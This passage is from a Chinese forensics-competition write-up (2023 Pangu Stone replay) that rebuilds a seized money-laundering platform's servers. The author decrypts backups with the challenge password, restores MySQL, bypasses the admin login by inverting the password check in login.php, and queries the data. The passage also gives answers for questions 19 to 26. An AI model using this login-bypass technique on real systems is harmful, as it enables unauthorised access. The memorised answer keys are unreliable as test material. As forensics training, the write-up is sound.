alt="image-20251107191858434"></p><p>接下来就是关闭防火墙服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107191909001.png" alt="image-20251107191909001"></p><p>接下来就将这个<code>sdb1</code>挂载到<code>/data</code>目录下，发现有<code>mysql</code>的备份</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107192035696.png" alt="image-20251107192035696"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107192050433.png" alt="image-20251107192050433"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107192425977.png" alt="image-20251107192425977"></p><p>接下来就是要将数据库备份<code>0515</code>这个压缩包解压，需要用到之前的密码之前的压缩命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czPf - <span class="variable">$BAK_DATE</span> | openssl des3 -salt -k p@ssw0rd -out db_backup_<span class="variable">$&#123;BAK_DATE&#125;</span>.tar.gz</span><br></pre></td></tr></table></figure><ul><li>那么我们解压命令就要是这样</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107193144425.png" alt="image-20251107193144425"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl des3 -d -k p@ssw0rd -in /data/mysql_back/db_backup_20230515.tar.gz | tar -xzPf -</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107193346799.png" alt="image-20251107193346799"></p><p>然后把<code>mysql</code>服务先打开</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107194223278.png" alt="image-20251107194223278"></p><p>接下来就是利用数据库备份文件修复数据库，使用命令，然后输入密码为<code>3W.pa0fen.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p paofen &lt; ./paofen.sql</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107193615263.png" alt="image-20251107193615263"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107194318584.png" alt="image-20251107194318584"></p><p>接下来就是进入一下数据库<code>mysql -uroot -p3W.pa0fen.com</code>，输入命令来开启mysql的一些日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log = ON;</span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">&quot;/tmp/general.log&quot;</span>；</span><br></pre></td></tr></table></figure><p>配置好后将<code>web</code>服务器也给关了，然后访问<code>http://192.168.91.141:8083/admin.php</code>就可以跳转到后台登录界面了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107203827730.png" alt="image-20251107203827730"></p><p>然后使用<code>navicat</code>连接数据库</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204058863.png" alt="image-20251107204058863"></p><p>发现<code>admin</code>的密码不是明文存储</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204136759.png" alt="image-20251107204136759"></p><p>直接去修改php源码在这个路径下<code>/www/admin.paofen.com/app/admin/controller/</code>发现有调用一个函数来处理用户和密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204717928.png" alt="image-20251107204717928"></p><p>之后再<code>/www/admin.paofen.com/app/admin/logic/</code>目录下找到了<code>login.php</code>文件，找到这个判断文件，直接将判断<code>$password</code>等于的变成不等于，接下来尝试登录</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204808799.png" alt="image-20251107204808799"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212031481.png" alt="image-20251107212031481"></p><p>修改登录逻辑后就可以直接登录成功了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212049032.png" alt="image-20251107212049032"></p><h2 id="question19"><a href="#question19√" class="headerlink" title="question19√"></a>question19√</h2><p>请分析服务器，给出跑分网站后台用户余额总计？[答案格式:1000]</p><p>重构完网站就能看到</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212130413.png" alt="image-20251107212130413"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7459848</span></span><br></pre></td></tr></table></figure><h2 id="question20"><a href="#question20√" class="headerlink" title="question20√"></a>question20√</h2><p>请分析服务器，给出跑分平台后台未处理的用户申请有多少个？[答案格式:1000]</p><p>一开始不同明白<code>后天</code>是什么鬼，后来反映过来是后台，应该是<code>24+0+0=24</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212513100.png" alt="image-20251107212513100"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24</span><br></pre></td></tr></table></figure><h2 id="question21"><a href="#question21√" class="headerlink" title="question21√"></a>question21√</h2><p>请分析服务器，给出会员聂鸿熙推荐人的姓名？[答案格式:张三]</p><p>直接找到会员列表，搜索<code>聂鸿熙</code>，找到推荐人</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212826585.png" alt="image-20251107212826585"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针长兴</span><br></pre></td></tr></table></figure><h2 id="question22"><a href="#question22√" class="headerlink" title="question22√"></a>question22√</h2><p>请分析服务器，给出给出跑分平台内用户银行卡所属银行共有几家？[答案格式:10]</p><p>直接翻数据库，找到<code>user_bank</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107213618543.png" alt="image-20251107213618543"></p><p>使用<code>sql</code>查询语句进行查询操作和去重操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(DISTINCT bank_name) FROM `ob_user_bank`</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107213709906.png" alt="image-20251107213709906"></p><h2 id="question23"><a href="#question23√" class="headerlink" title="question23√"></a>question23√</h2><p>接上题，请给出这些银行中用户数最多的银行名称？[答案格式:xx银行]</p><p>继续在<code>ob_user_bank</code>数据库中进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> bank_name, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> total</span><br><span class="line"><span class="keyword">FROM</span> ob_user_bank</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> bank_name;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107214545009.png" alt="image-20251107214545009"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">农业银行</span><br></pre></td></tr></table></figure><h2 id="question24"><a href="#question24√" class="headerlink" title="question24√"></a>question24√</h2><p>请分析服务器，给出用户“祝虹雨”通过审核的充值总额？[答案格式:10]</p><p>先在数据库中找到他的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `ob_user` WHERE real_name = &#x27;祝虹雨&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107215116565.png" alt="image-20251107215116565"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107220736539.png" alt="image-20251107220736539"></p><p>然后直接查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(money) FROM `ob_charge_log` WHERE name=<span class="string">&#x27;祝虹雨&#x27;</span> AND `status`=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107220903859.png" alt="image-20251107220903859"></p><h2 id="重构web网站2"><a href="#重构web网站2" class="headerlink" title="重构web网站2"></a>重构web网站2</h2><p>接下来就是另一个网站了，因为翻看<code>web</code>服务器的<code>www</code>目录会发现不仅有<code>admin.paofen.com</code>还有一个<code>3w.paofen.com</code>（其实不是这个网站，而是在另一个服务器中有<code>hy.paofen.com</code>），并且之前还看到了<code>nginx</code>上面开放了<code>8084</code>端口</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107221601305.png" alt="image-20251107221601305"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107222156517.png" alt="image-20251107222156517"></p><p>接下来要打开这个虚拟机，要调一下线程和内存</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107221722608.png" alt="image-20251107221722608"></p><p>开启后还是要像之前一样改密码，启动起来后直接ssh连接</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230342257.png" alt="image-20251107230342257"></p><p>发现这个服务器上有宝塔</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230553585.png" alt="image-20251107230553585"></p><p>直接取消一些宝塔的登录限制，并且修改密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230845543.png" alt="image-20251107230845543"></p><p>直接访问网站</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230943750.png" alt="image-20251107230943750"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231050679.png" alt="image-20251107231050679"></p><p>开3个服务网址太卡了，直接看数据库吧，发现数据库还有个备份，发现这边的数据库服务已经起起来了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231519335.png" alt="image-20251107231519335"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231601747.png" alt="image-20251107231601747"></p><p>直接修改权限连接数据库，发现用原始密码半天登不进去，直接该密吧，还得关闭一下防火墙（或者直接通过面板访问就行，还是太卡了直接把db服务器关了）</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231628478.png" alt="image-20251107231628478"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107232121491.png" alt="image-20251107232121491"></p><ul><li>连接后发现是空表，那就直接恢复数据库</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107232949443.png" alt="image-20251107232949443"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233006131.png" alt="image-20251107233006131"></p><p>其实这里网站已经起起来了，只是宝塔没有域名解析到，直接访问对应的ip地址即可，由于之前修改了数据库密码，现在还要修改一下数据库密码才能正常访问网站</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107234952916.png" alt="image-20251107234952916"></p><p>然后查看一下<code>nginx</code>的三个端口<code>888</code>不行、<code>80</code>也不行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235050075.png" alt="image-20251107235050075"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235110663.png" alt="image-20251107235110663"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235140564.png" alt="image-20251107235140564"></p><p>发现8085可以，但是网站好像没起来</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235203184.png" alt="image-20251107235203184"></p><p>宝塔加载这个要加载非常久，最后还会错误提示，之后启动一下就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235711387.png" alt="image-20251107235711387"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235723800.png" alt="image-20251107235723800"></p><p>发现能访问了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235747432.png" alt="image-20251107235747432"></p><ul><li>在这个目录下找到了一个比较奇怪的文件名，这个应该就是admin登录页面了</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108000131716.png" alt="image-20251108000131716"></p><ul><li>发现是的</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108000224405.png" alt="image-20251108000224405"></p><h2 id="question25"><a href="#question25√" class="headerlink" title="question25√"></a>question25√</h2><p>请分析服务器，给出该跑分团队可能的办公大楼有几个？[答案格式:1]</p><p>恢复数据库后翻找数据库，发现拥有两个会议，那应该有两个办公大楼</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233215324.png" alt="image-20251107233215324"></p><ul><li>其实更准确的应该在这个表</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233325493.png" alt="image-20251107233325493"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h2 id="question26"><a href="#question26√" class="headerlink" title="question26√"></a>question26√</h2><p>请分析服务器，给出用户John共提了几次会议预约申请，通过了几个？[答案格式:1，1]</p><p>看到这个表，看就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233403379.png" alt="image-20251107233403379"></p><p><img 